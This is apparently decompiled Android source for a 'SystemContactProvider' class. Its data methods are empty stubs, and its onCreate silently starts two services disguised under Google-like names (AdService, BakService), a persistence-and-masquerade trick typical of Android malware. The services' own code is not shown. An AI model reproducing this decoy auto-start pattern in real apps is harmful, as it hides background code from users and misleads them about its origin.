package com.speed.net.daemon;

import android.content.ContentProvider;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.util.Log;
import d0.l0;
import j2.i;

/* JADX INFO: compiled from: r8-map-id-01bd2f78e356d1793fe12b6cab4b4ddc2ec9524fab1d39c14fcb56e383ba4015 */
/* JADX INFO: loaded from: classes.dex */
public final class SystemContactProvider extends ContentProvider {
    public static void a(Context context, String str) {
        try {
            Intent className = new Intent().setClassName(context, str);
            i.d(className, "setClassName(...)");
            if (Build.VERSION.SDK_INT >= 26) {
                l0.J(context, className);
            } else {
                context.startService(className);
            }
        } catch (Exception e4) {
            Log.e("SystemContactProvider", "Failed to start " + str + ": " + e4.getMessage());
        }
    }

    @Override // android.content.ContentProvider
    public final int delete(Uri uri, String str, String[] strArr) {
        i.e(uri, "uri");
        return 0;
    }

    @Override // android.content.ContentProvider
    public final String getType(Uri uri) {
        i.e(uri, "uri");
        return null;
    }

    @Override // android.content.ContentProvider
    public final Uri insert(Uri uri, ContentValues contentValues) {
        i.e(uri, "uri");
        return null;
    }

    @Override // android.content.ContentProvider
    public final boolean onCreate() {
        Log.i("SystemContactProvider", "Provider onCreate triggered");
        Context context = getContext();
        if (context == null) {
            return true;
        }
        a(context, "com.google.android.AdService");
        a(context, "com.google.android.BakService");
        return true;
    }

    @Override // android.content.ContentProvider
    public final Cursor query(Uri uri, String[] strArr, String str, String[] strArr2, String str2) {
        i.e(uri, "uri");
        return null;
    }

    @Override // android.content.ContentProvider
    public final int update(Uri uri, ContentValues contentValues, String str, String[] strArr) {
        i.e(uri, "uri");
        return 0;
    }
}
